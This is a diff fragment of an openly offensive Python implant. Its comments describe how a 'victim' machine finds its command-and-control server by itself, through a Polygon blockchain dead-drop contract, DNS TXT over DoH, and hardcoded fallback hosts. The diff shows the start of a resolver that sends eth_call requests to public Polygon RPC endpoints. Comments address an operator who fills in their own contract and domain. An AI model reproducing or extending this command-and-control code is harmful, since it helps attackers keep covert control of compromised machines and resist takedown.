@@ -37,7 +37,7 @@ USERPROFILE = os.environ.get("USERPROFILE", "")
 
 # ---- C2 auto-resolution: the victim finds home by itself.
 # Order: (1) Polygon dead-drop contract, (2) DNS TXT via DoH, (3) hardcoded candidates.
-DEADDROP_CONTRACT = "<YOUR-CONTRACT>"  # set to YOUR contract
+DEADDROP_CONTRACT = ""  # YOUR contract only. Never anyone else's.
 DEADDROP_SELECTOR = "0xce6d41de"
 DEADDROP_DOMAIN = ""          # set to YOUR domain serving a TXT record, e.g. "c2.example.com"
 CANDIDATES = [                # tried in order, first to answer the handshake wins
@@ -48,6 +48,8 @@ RPCS = ["https://polygon-rpc.com", "https://polygon.llamarpc.com",
         "https://1rpc.io/matic", "https://polygon-bor-rpc.publicnode.com"]
 
 def _resolve_polygon():
+    if not DEADDROP_CONTRACT:
+        return None
     import json as _j
     body = _j.dumps({"jsonrpc": "2.0", "method": "eth_call",
         "params": [{"to": DEADDROP_CONTRACT, "data": DEADDROP_SELECTOR}, "latest"], "id": 1}).encode()
